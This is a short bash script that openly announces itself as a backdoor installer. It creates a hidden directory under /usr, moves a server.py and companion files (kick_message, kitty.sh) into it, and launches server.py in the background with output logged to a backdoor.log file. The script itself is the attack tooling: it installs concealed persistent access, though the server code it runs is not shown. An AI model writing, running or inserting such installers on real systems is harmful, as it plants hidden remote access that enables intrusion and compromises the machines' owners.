#!/bin/bash
clear
echo "[+] Installing Backdoor..."
mkdir /usr/.f-root
mv server.py /usr/.f-root/
mv kick_message /usr/.f-root/
mv kitty.sh /usr/.f-root/
cd /usr/.f-root/
python3 /usr/.f-root/server.py >/usr/.f-root/backdoor.log 2>/usr/.f-root/backdoor.log &
echo "[+] Backdoor Installed... on (/usr/.f-root)"
